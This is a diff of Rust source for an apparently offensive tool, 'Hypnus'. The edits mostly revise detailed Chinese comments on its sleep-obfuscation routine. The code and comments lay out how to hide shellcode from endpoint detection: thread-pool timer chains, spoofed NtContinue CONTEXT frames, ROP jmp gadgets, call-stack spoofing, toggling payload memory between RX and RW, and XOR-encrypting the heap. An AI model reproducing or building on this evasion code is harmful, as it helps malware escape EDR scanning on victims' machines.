@@ -279,8 +279,8 @@ impl Hypnus {
     /// Performs memory obfuscation using a thread-pool timer sequence.
     fn timer(&mut self) -> Result<()> {
         unsafe {
-            // Determine if heap obfuscation and RWX memory should be use:heap/projection都是ObfMode字段的值.
-            // 堆混淆的开关,决定主线程在挂起前/唤醒后,是否需要调用RDTSC硬件指令生成密钥对私有HpynusHeap xor/解密.一次保护载荷在运行期动态申请的内存不被扫描.
+            // Determine if heap obfuscation and RWX memory should be use:heap是ObfMode字段的值.
+            // 堆混淆的开关,决定主线程在挂起前/唤醒后,是否需要调用RDTSC硬件指令生成密钥对私有HpynusHeap xor/解密.一次性保护载荷在运行期动态申请的内存不被扫描.
             // 用在后续let key = if heap{}这里,检查是否启用自定义堆加密.当然还有后续解锁内存的操作
             let heap = self.mode.contains(ObfMode::Heap);
             // 指定内存权限.载荷唤醒后的权限,用于在ctx[7]载荷解密后,将内存恢复为rx还是rwx.
@@ -289,6 +289,7 @@ impl Hypnus {
             let protection = if self.mode.contains(ObfMode::Rwx) {
                 PAGE_EXECUTE_READWRITE
             } else {
+
                 PAGE_EXECUTE_READ
             };
 
@@ -317,7 +318,7 @@ impl Hypnus {
 
             // Allocate dedicated threadpool with one worker
 
-            // 指向TP_POOL的句柄:是整个线程池的根,后续所有线程数量/栈大小都通过整个pool指针进行挂载
+            // 指向TP_POOL的句柄:是整个线程池的根,后续所有线程数量/栈大小都通过这个pool指针进行挂载
             let mut pool = null_mut();
 
             // TpAllocPool在用户态堆区分配并初始化一个TP_POOL结构体,并在内核中创建一个Worker Factory对象.没有产生真正的线程.
@@ -441,7 +442,7 @@ impl Hypnus {
 
 
             // Wait for context capture to complete
-            // 将当前线程陷入休眠,直到指定信号出现
+            // 将当前线程陷入休眠,直到指定信号出现.绑定events[0]和NtWaitForSingleObject
             status = NtWaitForSingleObject(
                 // 等待的对象
                 events[0],
@@ -456,8 +457,8 @@ impl Hypnus {
             // CONTEXT是执行环境,Config是所需api/rop gadget/堆栈欺骗用到的函数地址
             // 利用config填充context.
             // Build multi-step spoofed CONTEXT chain
-            // 每个ctx_init都是cpu的瞬时寄存器数据,用于加载到NtContinue,通过Ntcontinue构建config,然后修改config执行指定的函数.这些函数沟通构建  功能
-            // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
+            // 每个ctx_init都是cpu的瞬时寄存器数据,用于加载到NtContinue,通过Ntcontinue构建config,然后修改config执行指定的函数.这些函数沟通构建功能
+            // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存(栈)执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
             let mut ctxs = [ctx_init; 10];
 
             // 将10个ctx_init的rax设为Ntcontinue;且栈变小
@@ -499,7 +500,7 @@ impl Hypnus {
             // Base CONTEXT for spoofing
             ctx_init.Rsp = current_rsp();
 
-            // ctx_init是payload.spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链.这里ctx_init提供当前栈顶地址
+            // spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链.这里ctx_init提供当前栈顶地址
             // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
             let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);
 
@@ -507,19 +508,24 @@ impl Hypnus {
             // 将该伪造栈帧的 RIP 设置为系统函数NtWaitForSingleObject 的地址。即当该栈帧被“加载”到 CPU时，它就像是一个系统调用
             //  jmp内部调用Gadget::new,在指定dll中搜索预设的jmp <reg>机器码;jmp内部调用apply()将找到的物理地址与目标api注入到CPONTEXT和寄存器中.在之前for ctx中已经将rax设为ntcontinue.后续通过tpsettimer导致ntcontinue被调用,才真正执行
             ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
-            // 遵循win64 fastcall约定,通过寄存器将参数传递给目标函数
+            // 遵循win64 fastcall约定,通过寄存器将参数传递给目标函数.
+            // 这里将events[1]与NtWaitForSingle绑定.只有events[1]发信号这个绑定的函数才会执行
             ctxs[0].Rcx = events[1] as u64;
             ctxs[0].Rdx = 0;
             ctxs[0].R8  = 0;
 
-            // Temporary RW access;将原本r/x的shellcode内存转为rw读写状态
+            // Temporary RW access;将原本rx的shellcode内存转为rw读写状态
             let mut old_protect = 0u32;
             // 将全局配置拷贝到当前栈帧.因为NtProtectVirtualMemor要求传入的是变量地址(指针的指针).且会为了对齐页面边界动态修改这两个变量的值
             let (mut base, mut size) = (self.base, self.size);
-            // 
-            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
+
+            // 将当前rip设为jmp的第三个参数.作为跳转地址
+            ctxs[1].jmp(
+                self.cfg,
+                self.cfg.nt_protect_virtual_memory.into());
+
             ctxs[1].Rcx = NtCurrentProcess() as u64;
-            // 这里的base不是shellcode的地址,是存放shellcode地址的那个变量的地址(即&base).因为NT API 需要能够修改base值对齐内存页
+            // 这里的base不是shellcode的地址,是存放shellcode地址的那个变量的地址(即指针的指针 &base).因为NT API 需要能够修改base值对齐内存页.size同理
             // 在Trait Asu64中,重新定义的as_u64()方法,以契合此处Nt api的参数要求
             ctxs[1].Rdx = base.as_u64();
             ctxs[1].R8  = size.as_u64();
